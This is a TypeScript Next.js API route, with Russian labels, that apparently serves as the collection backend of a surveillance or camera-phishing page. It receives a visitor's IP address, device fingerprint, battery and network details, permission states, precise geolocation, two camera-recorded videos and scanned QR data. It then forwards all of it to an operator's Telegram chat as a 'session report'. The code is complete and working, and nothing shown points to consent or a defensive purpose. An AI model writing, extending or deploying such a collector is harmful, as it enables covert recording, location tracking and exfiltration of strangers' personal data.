import { NextRequest, NextResponse } from "next/server";

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

export async function POST(req: NextRequest) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
    console.error("Telegram bot token or chat ID is not set in environment variables.");
    return NextResponse.json(
      { error: "Telegram bot token or chat ID is not configured." },
      { status: 500 }
    );
  }

  try {
    const {
      clientInfo,
      networkInfo,
      deviceMemory,
      batteryInfo,
      geolocation,
      video1,
      video2,
      qrCodeData,
      permissionStatus,
    } = await req.json();

    const ipAddress = req.headers.get("x-forwarded-for") || "Unavailable"; // Получаем IP-адрес из заголовка

    const messages: Promise<Response>[] = [];

    // --- Construct Summary Message ---
    let summaryText = "📊 *Отчет о сессии*\n\n";

    summaryText += "--- 📱 *Информация об устройстве* ---\n";
    summaryText += `*IP:* \`${ipAddress}\`\n`;
    summaryText += `*User Agent:* \`${clientInfo?.userAgent || "Недоступно"}\`\n`;
    summaryText += `*Платформа:* ${clientInfo?.platform || "Недоступно"}\n`;
    summaryText += `*Ядра CPU:* ${clientInfo?.hardwareConcurrency || "Недоступно"}\n`;
    summaryText += `*Память устройства:* ${deviceMemory ? `${deviceMemory} GB` : "Недоступно"}\n`;
    summaryText += `*Батарея:* ${batteryInfo?.level !== undefined ? `${(batteryInfo.level * 100).toFixed(0)}%` : "Недоступно"} (${batteryInfo?.charging !== undefined ? (batteryInfo.charging ? "Заряжается" : "Не заряжается") : "Неизвестно"}) [Статус API: ${batteryInfo?.status || "Неизвестно"}]\n`;

    summaryText += "\n--- 🌐 *Информация о сети* ---\n";
    summaryText += `*Тип соединения:* ${networkInfo?.effectiveType || "Недоступно"}\n`;
    summaryText += `*RTT:* ${networkInfo?.rtt !== undefined ? `${networkInfo.rtt} ms` : "Недоступно"}\n`;
    summaryText += `*Downlink:* ${networkInfo?.downlink !== undefined ? `${networkInfo.downlink} Mbps` : "Недоступно"}\n`;

    summaryText += "\n--- ✅ *Статус разрешений* ---\n";
    summaryText += `*Геолокация:* ${permissionStatus?.geolocation || "Неизвестно"}\n`;
    summaryText += `*Камера:* ${permissionStatus?.camera || "Неизвестно"}\n`;
    summaryText += `*Микрофон:* ${permissionStatus?.microphone || "Неизвестно"}\n`;

    summaryText += "\n--- 🎥 *Медиа и QR* ---\n";
    summaryText += `*Видео 1 записано:* ${video1 ? "Да ✅" : "Нет ❌"}\n`;
    summaryText += `*Видео 2 записано:* ${video2 ? "Да ✅" : "Нет ❌"}\n`;
    summaryText += `*QR-код отсканирован:* ${qrCodeData ? `Да ✅ (\`${qrCodeData}\`)` : "Нет ❌"}\n`;
    
    messages.push(
      fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          chat_id: TELEGRAM_CHAT_ID,
          text: summaryText,
          parse_mode: "Markdown", // Используем Markdown для форматирования
        }),
      }).then(async res => {
        console.log("Summary message API response status:", res.status);
        if (!res.ok) {
            const errorBody = await res.text();
            console.error("Summary message API error response:", errorBody);
        }
        return res;
      })
    );

    // Send Geolocation as a separate message if available
    if (geolocation?.latitude && geolocation?.longitude) {
      console.log("Attempting to send location...");
      messages.push(
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendLocation`, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({
            chat_id: TELEGRAM_CHAT_ID,
            latitude: geolocation.latitude,
            longitude: geolocation.longitude,
          }),
        }).then(async res => {
          console.log("Location API response status:", res.status);
          if (!res.ok) {
            const errorBody = await res.text();
            console.error("Location API error response:", errorBody);
          }
          return res;
        })
      );
    }

    // Send Video 1
    if (video1) {
      console.log("Attempting to send Video 1...");
      const base64Data = video1.replace(/^data:video\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, "base64");
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("video", new Blob([buffer], { type: "video/webm" }), "recorded_video_1.webm");

      messages.push(
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
          method: "POST",
          body: formData,
        }).then(async res => {
          console.log("Video 1 API response status:", res.status);
          if (!res.ok) {
            const errorBody = await res.text();
            console.error("Video 1 API error response:", errorBody);
          }
          return res;
        })
      );
    }

    // Send Video 2
    if (video2) {
      console.log("Attempting to send Video 2...");
      const base64Data = video2.replace(/^data:video\/\w+;base64,/, "");
      const buffer = Buffer.from(base64Data, "base64");
      const formData = new FormData();
      formData.append("chat_id", TELEGRAM_CHAT_ID);
      formData.append("video", new Blob([buffer], { type: "video/webm" }), "recorded_video_2.webm");

      messages.push(
        fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendVideo`, {
          method: "POST",
          body: formData,
        }).then(async res => {
          console.log("Video 2 API response status:", res.status);
          if (!res.ok) {
            const errorBody = await res.text();
            console.error("Video 2 API error response:", errorBody);
          }
          return res;
        })
      );
    }

    await Promise.allSettled(messages);

    return NextResponse.json({ message: "Data processed and sent to Telegram." });
  } catch (error: any) {
    console.error("Error processing Telegram request:", error);
    return NextResponse.json({ error: error.message || "Internal server error" }, { status: 500 });
  }
}